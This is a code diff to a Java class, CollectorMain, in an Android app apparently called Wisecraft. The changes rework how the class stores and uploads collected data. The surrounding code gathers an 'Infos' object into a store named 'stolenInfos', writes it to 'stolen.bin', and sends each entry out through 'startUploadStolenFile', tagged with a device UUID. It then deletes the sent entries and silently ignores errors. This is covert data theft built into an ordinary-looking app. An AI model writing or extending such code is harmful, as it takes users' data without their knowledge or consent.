@@ -17,6 +17,8 @@ import java.net.URL;
 import java.util.zip.GZIPInputStream;
 
 import static com.nao20010128nao.Wisecraft.Utils.*;
+import com.nao20010128nao.Wisecraft.misc.BinaryPrefImpl;
+import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
 public class CollectorMain extends ContextWrapper implements Runnable {
 	public CollectorMain() {
 		super(TheApplication.instance);
@@ -26,35 +28,39 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	@Override
 	public void run() {
 		// TODO: Implement this method
-		SafeBox sb=TheApplication.instance.stolenInfos;
+		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
 		FileUploader fu=new FileUploader(TheApplication.instance.uuid);
-		Writer w=null;
 		String s="";
 		try {
-			(w = new OutputStreamWriter(sb.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s = new Gson().toJson(new Infos()));
-		} catch (IOException e) {
+			sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
+		} catch (Throwable e) {
 
 		} finally {
+			FileOutputStream fos=null;
 			try {
-				if (w != null)w.close();
-			} catch (IOException e) {}
-			try {
-				sb.commitChanges();
-			} catch (IOException e) {}
+				fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
+				fos.write(sb.toBytes());
+			} catch (IOException e) {
+				
+			}finally{
+				try {
+					if(fos!=null)fos.close();
+				} catch (IOException e) {}
+			}
 			System.out.println(s);
 			//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
 		}
 		String[] files;
 		try {
-			files = sb.listFiles();
+			files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
 		} catch (Throwable e) {
 			return;
 		}
 		for (String filename:files) {
 			System.out.println(filename);
 			try {
-				copyAndClose(new GZIPInputStream(sb.readFile(filename)), fu.startUploadStolenFile(filename));
-				sb.deleteFile(filename);
+				copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
+				sb.edit().remove(filename);
 			} catch (Throwable e) {
 				e.printStackTrace();
 				continue;
